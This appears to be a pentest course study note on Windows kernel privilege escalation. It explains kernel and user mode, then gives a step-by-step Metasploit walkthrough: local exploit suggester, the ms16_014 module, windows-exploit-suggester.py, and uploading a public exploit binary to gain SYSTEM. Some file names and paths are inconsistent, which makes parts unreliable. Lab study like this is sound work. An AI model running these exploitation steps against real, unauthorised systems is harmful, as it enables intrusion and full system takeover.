# Windows Kernel Exploits

## Privilege Escalatation
- Privilege Escalation is the process of exploiting vulnerabilites or misconfigurations in systems to elevate privileges from one user to another, typically to a user with administrative or root access on a system.
- Privilage Escalation is a vital element of the attack life cycle and is a major determinant in the overall success of a pentest.
- After gaining an initial foothold on a target system you will be required to elevate your privileges in order to perform tasks and functionality that require administrative privileges.

## Windows Kernel
- A Kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.
- Windows NT is the kernel tht comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exeptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
  1. User Mode - Programs and services running in user mode have limited access to system resources and functionality.
  2. Kernel Mode - Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.

If we can exploit the windows kernel, and execute code in kernel mode, this code will be executed with highest level of privileges available.
Kernel interaction means increased likelyhood for system crashed and data loss. Not for enterprise environment

## Windows Kernel Exploitation
- Kernel exploits on Windows will typically target vulnerabilites in the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
- This process will differ based on the version of Windows being targeted and the kernel exploit being used.
- Privilege escalation on Windows systems will typically follow the following methodology:
  - Identifying kernel vulnerabilites
  - Downloading, compiling and transferring kernel exploits onto the target system.
 
## Tools & Environment
- Windows Exploit Suggester - Compares target patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules
- Windows-Kernel-Exploits - Collection of Windows Kernel exploits sorted by CVE

## Demo

msf6: `sessions`: In our case, we have a powerhsell and a meterpreter x64 session 
![grafik](https://github.com/user-attachments/assets/c50b2df5-5cd1-428e-bcd2-05b5339728b6)

msf6 meterpreter: `getsystem`

msf6: `search suggester` (before that we put meterpreter in background

msf6: `use 0`

msf6: `show options`

msf6: `sessions`

msf6: `run`: Enumerates all vulnerabilites in this version of windows and what metasploit modues we can use

We can google the metasploit framework to get more info.

msf6: `use exploit/windows/local/ms16_014_wmi_recv_notif`

msf6: `show options`

msf6: `set SESSION 3`

msf6: `set LPORT 4422`

msf6: `exploit`

Now we should get a meterpreter session with elevated privileges.

meterpreter: `getuid` we successfully elevated our privileges with the kernel exploit

background

msf6: `session 3`: we switch to session 3 which is unprivileged

meterpreter: `getuid`: we verify if thats the case

We check out the Windows Exploit Suggester

meterpreter: `shell`

shell: `systeminfo`: we need to copy into a txt file because it contains a list of hotfixes and based on this the windows exploit will determine which exploit can be used against this version of windows with this hotfixes installed.

new terminal: `Desktop`
`vim win7.txt`
copy systeminfo
`quit`
`ls` check if stored
`cd WIndows-Enum/WindowsExploitSuggester`: move into github rep directory
`./windows-exploit-suggester.py --update`: Downloads new vulnerability database
`./windows-exploit--suggester.py`:runs it
`--database 20xx-xx-xx-mssb.xls --systeminfo ~/Desktop/win7.txt`: those at very top are the exploits with the most chances. We can copy the MS Vuln. ID and google. We check the exploit in GitHub. There we can find the prebuild binary which we can run. Then we should have evelated privileges.

We use the meterpreter access to upload this exploit into the temp directory on the windows system
`cd C:\\`: we never use the home directory on a user account, because its frequently accessed by the user.
`upload ~/Downloads/41015.exe`
`shell`
C:\tEMP: `dir`
C:\tEMP: `410015.exe` We use the kernel exploit
C:\tEMP: `.\41015.exe`
C:\tEMP: `whoami` nt authority system. We got successfully access to the targer







